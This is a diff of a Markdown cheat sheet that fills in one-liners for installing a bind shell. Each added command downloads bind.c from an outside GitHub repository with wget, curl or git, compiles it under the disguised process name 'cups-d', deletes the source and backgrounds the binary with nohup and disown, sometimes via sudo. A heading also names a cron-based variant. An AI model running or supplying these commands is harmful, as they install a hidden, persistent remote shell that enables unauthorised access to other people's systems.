@@ -10,11 +10,11 @@ sudo apt-get install --yes wget gcc binutils || sudo yum -y install wget gcc bit
 ```
 ### RUN(current user):
 ```console
-wget -O bind.c && gcc ./bind.c -o ./cups-d ; rm -f ./bind.c 2>/dev/null || nohup ./cups-d & || disown 2>/dev/null
+wget -O bind.c https://github.com/ScorpionInc/C-Sandbox/raw/main/CBindShell/bind.c && gcc ./bind.c -o ./cups-d ; rm -f ./bind.c 2>/dev/null || nohup ./cups-d & || disown 2>/dev/null
 ```
 ### RUN(via sudo):
 ```console
-wget -O bind.c && gcc ./bind.c -o ./cups-d ; rm -f ./bind.c 2>/dev/null || sudo nohup sudo ./cups-d & || disown 2>/dev/null
+wget -O bind.c https://github.com/ScorpionInc/C-Sandbox/raw/main/CBindShell/bind.c && gcc ./bind.c -o ./cups-d ; rm -f ./bind.c 2>/dev/null || sudo nohup sudo ./cups-d & || disown 2>/dev/null
 ```
 
 ## BIND / Curl / GCC
@@ -28,11 +28,11 @@ sudo apt-get install --yes curl gcc binutils || sudo yum -y install curl gcc bin
 ```
 ### RUN(current user):
 ```console
-curl -o bind.c && gcc ./bind.c -o ./cups-d || rm -f ./bind.c 2>/dev/null || nohup ./cups-d & || disown 2>/dev/null
+curl -o bind.c https://github.com/ScorpionInc/C-Sandbox/raw/main/CBindShell/bind.c && gcc ./bind.c -o ./cups-d || rm -f ./bind.c 2>/dev/null || nohup ./cups-d & || disown 2>/dev/null
 ```
 ### RUN(via sudo):
 ```console
-curl -o bind.c && gcc ./bind.c -o ./cups-d || rm -f ./bind.c 2>/dev/null || sudo nohup sudo ./cups-d & || disown 2>/dev/null
+curl -o bind.c https://github.com/ScorpionInc/C-Sandbox/raw/main/CBindShell/bind.c && gcc ./bind.c -o ./cups-d || rm -f ./bind.c 2>/dev/null || sudo nohup sudo ./cups-d & || disown 2>/dev/null
 ```
 ## BIND / Git / GCC
 ### SETUP(as root):
@@ -45,11 +45,11 @@ sudo apt-get install –yes git gcc binutils || sudo yum install git gcc binutil
 ```
 ### RUN(current user):
 ```console
-git clone URL && cp ./folder/bind.c ./bind.c || rm -rf ./folder 2>/dev/null || nohup ./cups-d & || disown 2>/dev/null
+git clone https://github.com/ScorpionInc/C-Sandbox.git && cp ./C-Sandbox/CBindShell/bind.c ./bind.c; rm -rf ./C-Sandbox/ 2>/dev/null; gcc ./bind.c -o ./cups-d && nohup ./cups-d & || disown 2>/dev/null
 ```
 ### RUN(via sudo):
 ```console
-git clone URL && cp ./folder/bind.c ./bind.c || rm -rf ./folder 2>/dev/null || sudo nohup sudo ./cups-d & || disown 2>/dev/null
+git clone https://github.com/ScorpionInc/C-Sandbox.git && cp ./C-Sandbox/CBindShell/bind.c ./bind.c; rm -rf ./C-Sandbox/ 2>/dev/null; gcc ./bind.c -o ./cups-d && sudo nohup sudo ./cups-d & || disown 2>/dev/null
 ```
 
 ## BIND-CRON / WGet / GCC
